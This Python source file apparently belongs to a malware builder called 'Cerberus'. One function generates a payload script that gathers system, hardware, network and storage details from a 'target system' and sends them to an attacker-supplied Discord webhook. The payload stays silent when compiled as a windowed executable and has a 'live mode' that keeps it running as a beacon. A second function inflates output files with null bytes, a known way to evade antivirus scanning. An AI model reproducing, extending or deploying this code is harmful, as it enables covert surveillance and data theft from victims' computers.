# file_utils.py
import os

def generate_payload_script_content(config):
    webhook_url_str = config.get('webhook_url', '')
    if not webhook_url_str:
        error_message = "Critical Error: Webhook URL (for results) was not provided."
        print(f"[file_utils] {error_message}")
        return f"print('{error_message}'); import sys; sys.exit(1)"

    webhook_url_repr = repr(webhook_url_str)

    # Get system info category flags
    include_overview = config.get('include_sysinfo_overview', False)
    include_hardware = config.get('include_sysinfo_hardware', False)
    include_network_connectivity = config.get('include_sysinfo_network_connectivity', False)
    include_active_interfaces = config.get('include_sysinfo_active_interfaces', False)
    include_storage = config.get('include_sysinfo_storage', False)
    include_misc_network = config.get('include_sysinfo_misc_network', False)

    # Get live execution mode flag
    live_execution_mode = config.get('live_execution_mode', False)
    # COMMAND_READ_WEBHOOK_URL_OR_BOT_TOKEN is not used by the payload yet in this iteration.
    # It would be embedded if live_execution_mode is True for future command polling.

    script_lines = [
        "import os",
        "import sys",
        "import time",
        "import traceback",
        "import json",
        "import uuid", # For generating unique payload ID in live mode
        "",
        "try:",
        "    import webhook_utils",
        "    import system_info",
        "except ImportError as e:",
        "    # This print won't show in a --windowed app.",
        "    # print(f'FATAL PAYLOAD INIT ERROR: Could not import core modules: {{e}}')",
        "    sys.exit(1)",
        "",
        "# --- Payload Configuration (Embedded from Builder) ---",
        f"RESULTS_WEBHOOK_URL = {webhook_url_repr}", # Renamed for clarity
        f"INCLUDE_OVERVIEW = {include_overview}",
        f"INCLUDE_HARDWARE = {include_hardware}",
        f"INCLUDE_NETWORK_CONNECTIVITY = {include_network_connectivity}",
        f"INCLUDE_ACTIVE_INTERFACES = {include_active_interfaces}",
        f"INCLUDE_STORAGE = {include_storage}",
        f"INCLUDE_MISC_NETWORK = {include_misc_network}",
        f"LIVE_EXECUTION_MODE = {live_execution_mode}",
        "PAYLOAD_INSTANCE_ID = None", # Will be set if in live mode
        "",
        "# --- Main Payload Logic ---",
        "def main_payload_operation():",
        "    global PAYLOAD_INSTANCE_ID", # To assign the generated ID
        "    _payload_log = lambda msg: print(f'[PAYLOAD LOG {{time.strftime(\"%H:%M:%S\")}}] {{msg}}') if not getattr(sys, 'frozen', False) else None", # Log only if not frozen
        "",
        "    _payload_log('Payload script started.')",
        "    current_timestamp = time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())",
        "    base_embed_data = {",
        "        'title': 'Cerberus Initial Report',", # Title changed
        "        'description': f'Initial data from target system at {{current_timestamp}}.',",
        "        'color': 0xDC143C,",
        "        'fields': [],",
        "        'footer': {'text': f'Cerberus Payload | {{current_timestamp}}'}",
        "    }",
        "",
        "    try:",
        "        collected_any_data = False",
        "",
        "        if LIVE_EXECUTION_MODE:",
        "            PAYLOAD_INSTANCE_ID = uuid.uuid4().hex",
        "            _payload_log(f'Live Mode. Instance ID: {{PAYLOAD_INSTANCE_ID}}')",
        "            base_embed_data['title'] = f'Cerberus Live Mode Check-In (ID: {{PAYLOAD_INSTANCE_ID[:8]}}...)'", # Add ID to title
        "",
        "        if INCLUDE_OVERVIEW:",
        "            _payload_log('Gathering system overview...')",
        "            try:",
        "                overview_data = system_info.get_overview_info()",
        "                if overview_data: base_embed_data['fields'].extend(overview_data); collected_any_data = True",
        "            except Exception as e: base_embed_data['fields'].append({'name': 'Overview Error', 'value': str(e)[:1000], 'inline': False})",
        "",
        "        if INCLUDE_HARDWARE:",
        "            _payload_log('Gathering hardware specs...')",
        "            try:",
        "                hardware_data = system_info.get_hardware_specs_info()",
        "                if hardware_data: base_embed_data['fields'].extend(hardware_data); collected_any_data = True",
        "            except Exception as e: base_embed_data['fields'].append({'name': 'Hardware Error', 'value': str(e)[:1000], 'inline': False})",
        "",
        "        if INCLUDE_NETWORK_CONNECTIVITY:",
        "            _payload_log('Gathering network connectivity...')",
        "            try:",
        "                net_conn_data = system_info.get_network_connectivity_info()",
        "                if net_conn_data: base_embed_data['fields'].extend(net_conn_data); collected_any_data = True",
        "            except Exception as e: base_embed_data['fields'].append({'name': 'Net Connectivity Error', 'value': str(e)[:1000], 'inline': False})",
        "",
        "        if INCLUDE_ACTIVE_INTERFACES:",
        "            _payload_log('Gathering active interfaces...')",
        "            try:",
        "                active_if_data = system_info.get_active_interfaces_info()",
        "                if active_if_data: base_embed_data['fields'].extend(active_if_data); collected_any_data = True",
        "            except Exception as e: base_embed_data['fields'].append({'name': 'Active Interfaces Error', 'value': str(e)[:1000], 'inline': False})",
        "",
        "        if INCLUDE_STORAGE:",
        "            _payload_log('Gathering storage info...')",
        "            try:",
        "                storage_data = system_info.get_storage_info()",
        "                if storage_data: base_embed_data['fields'].extend(storage_data); collected_any_data = True",
        "            except Exception as e: base_embed_data['fields'].append({'name': 'Storage Error', 'value': str(e)[:1000], 'inline': False})",
        "",
        "        if INCLUDE_MISC_NETWORK:",
        "            _payload_log('Gathering misc network info...')",
        "            try:",
        "                misc_net_data = system_info.get_misc_network_info()",
        "                if misc_net_data: base_embed_data['fields'].extend(misc_net_data); collected_any_data = True",
        "            except Exception as e: base_embed_data['fields'].append({'name': 'Misc Network Error', 'value': str(e)[:1000], 'inline': False})",
        "",
        "        if collected_any_data or LIVE_EXECUTION_MODE:", # Send initial report if any data or if it's live mode check-in
        "            _payload_log('Adding Python version to report.')",
        "            try:",
        "                py_ver_data = system_info.get_python_payload_version_info()",
        "                if py_ver_data: base_embed_data['fields'].extend(py_ver_data)",
        "            except: pass",
        "",
        "        if not base_embed_data['fields'] and not LIVE_EXECUTION_MODE :", # Only send ping if NOT live and NO fields
        "            _payload_log('No data categories selected and not live mode. Sending a basic ping.')",
        "            ping_embed = {",
        "                'title': 'Cerberus Payload Executed (No Data Categories Selected)',",
        "                'description': f'Payload ran at {{current_timestamp}} but no specific data was configured for collection.',",
        "                'color': 0x00FF00,",
        "                'footer': {'text': f'Cerberus Payload | {{current_timestamp}}'}",
        "            }",
        "            if RESULTS_WEBHOOK_URL: webhook_utils.send_to_discord(RESULTS_WEBHOOK_URL, ping_embed, retries=1)",
        "            return", # Exit if not live mode and no data
        "",
        "        _payload_log(f'Total embed fields for initial report: {{len(base_embed_data[\"fields\"])}}.')",
        "        if len(base_embed_data['description']) > 4096: base_embed_data['description'] = base_embed_data['description'][:4093] + '...'",
        "        total_field_char_count = 0",
        "        for field_idx, field in enumerate(list(base_embed_data['fields'])):",
        "            try:",
        "               field_name = str(field.get('name', f'Field {{field_idx+1}}'))[:256]",
        "               field_value = str(field.get('value', 'N/A'))[:1024]",
        "               base_embed_data['fields'][field_idx]['name'] = field_name",
        "               base_embed_data['fields'][field_idx]['value'] = field_value",
        "               total_field_char_count += len(field_name) + len(field_value)",
        "            except Exception as e_field_format:",
        "                base_embed_data['fields'][field_idx] = {'name': f'Field Format Error {{field_idx+1}}', 'value': str(e_field_format), 'inline': False}",
        "        if total_field_char_count > 5800: _payload_log('Warning: Embed fields potentially too large.')",
        "",
        "        if not RESULTS_WEBHOOK_URL: _payload_log('Results Webhook URL is not set.'); return", # Exit if no webhook for results
        "",
        "        if base_embed_data['fields'] or LIVE_EXECUTION_MODE:", # Send if fields exist OR it's a live mode check-in
        "            send_success = webhook_utils.send_to_discord(RESULTS_WEBHOOK_URL, base_embed_data)",
        "            if send_success: _payload_log('Initial report/check-in successful.')",
        "            else: _payload_log('Initial report/check-in failed.')",
        "",
        "    except Exception as e_initial_report:",
        "        _payload_log(f'ERROR during initial report: {{e_initial_report}}\\n{{traceback.format_exc()}}')",
        "        error_embed = {",
        "            'title': 'Cerberus Payload Initialisation CRITICAL ERROR',",
        "            'description': f'Payload Error: {{str(e_initial_report)}}'[:4090],",
        "            'color': 0xDC143C,",
        "            'fields': [{'name': 'Traceback Snippet', 'value': f'```python\\n{{traceback.format_exc()[:950]}}\\n```', 'inline': False}],",
        "            'footer': {'text': f'Error Timestamp: {{current_timestamp}}'}",
        "        }",
        "        if RESULTS_WEBHOOK_URL: webhook_utils.send_to_discord(RESULTS_WEBHOOK_URL, error_embed, retries=1)",
        "        # If live mode, try to stay alive despite initial error. If not, exit.",
        "        if not LIVE_EXECUTION_MODE: sys.exit(1)",
        "",
        "    # --- Live Execution Loop (if enabled) ---",
        "    if LIVE_EXECUTION_MODE:",
        "        _payload_log(f'Entering live execution loop. Instance ID: {{PAYLOAD_INSTANCE_ID}}. Awaiting commands (not implemented yet).')",
        "        # In future iterations, this loop will poll for commands.",
        "        # For now, it just keeps the script alive.",
        "        try:",
        "            while True:",
        "                time.sleep(60)  # Keep alive, poll interval for future commands",
        "                # _payload_log('Live loop heartbeat...') # Optional debug print",
        "                # Add command checking logic here in the future",
        "        except KeyboardInterrupt:",
        "            _payload_log('Live execution interrupted by user.')",
        "        except Exception as e_loop:",
        "            _payload_log(f'Error in live execution loop: {{e_loop}}\\n{{traceback.format_exc()}}')",
        "            # Send a final error message if possible",
        "            loop_error_embed = {",
        "                'title': f'Cerberus Live Payload Loop Error (ID: {{PAYLOAD_INSTANCE_ID[:8]}}...)',",
        "                'description': f'Error: {{str(e_loop)}}',",
        "                'color': 0xDC143C,",
        "                'fields': [{'name': 'Traceback Snippet', 'value': f'```python\\n{{traceback.format_exc()[:950]}}\\n```', 'inline': False}],",
        "                'footer': {'text': f'Error Timestamp: {{time.strftime(\"%Y-%m-%d %H:%M:%S UTC\", time.gmtime())}}'}",
        "            }",
        "            if RESULTS_WEBHOOK_URL: webhook_utils.send_to_discord(RESULTS_WEBHOOK_URL, loop_error_embed, retries=1)",
        "    else:",
        "        _payload_log('Payload exiting (not in live mode).')",
        "",
        "    _payload_log('Payload script finalization.')",
        "",
        "if __name__ == '__main__':",
        "    if 'RESULTS_WEBHOOK_URL' not in globals(): RESULTS_WEBHOOK_URL = None",
        "    if 'LIVE_EXECUTION_MODE' not in globals(): LIVE_EXECUTION_MODE = False", # Default for direct run
        "    if 'INCLUDE_OVERVIEW' not in globals(): INCLUDE_OVERVIEW = True", # Defaults for direct run
        "    if 'INCLUDE_HARDWARE' not in globals(): INCLUDE_HARDWARE = True",
        "    if 'INCLUDE_NETWORK_CONNECTIVITY' not in globals(): INCLUDE_NETWORK_CONNECTIVITY = True",
        "    if 'INCLUDE_ACTIVE_INTERFACES' not in globals(): INCLUDE_ACTIVE_INTERFACES = True",
        "    if 'INCLUDE_STORAGE' not in globals(): INCLUDE_STORAGE = True",
        "    if 'INCLUDE_MISC_NETWORK' not in globals(): INCLUDE_MISC_NETWORK = False",
        "    main_payload_operation()",
    ]
    return "\n".join(script_lines)

def pump_file(filepath, target_size_mb):
    # (pump_file function remains unchanged)
    target_size_bytes = int(target_size_mb * 1024 * 1024)
    if target_size_bytes <= 0: return False
    try:
        current_size_bytes = os.path.getsize(filepath)
        if current_size_bytes >= target_size_bytes: return True
        bytes_to_add = target_size_bytes - current_size_bytes
        with open(filepath, "ab") as f:
            chunk_size = 1024 * 1024
            num_chunks = bytes_to_add // chunk_size
            remaining_bytes = bytes_to_add % chunk_size
            for _ in range(num_chunks): f.write(b'\0' * chunk_size)
            if remaining_bytes > 0: f.write(b'\0' * remaining_bytes)
        return True
    except FileNotFoundError: return False
    except Exception: return False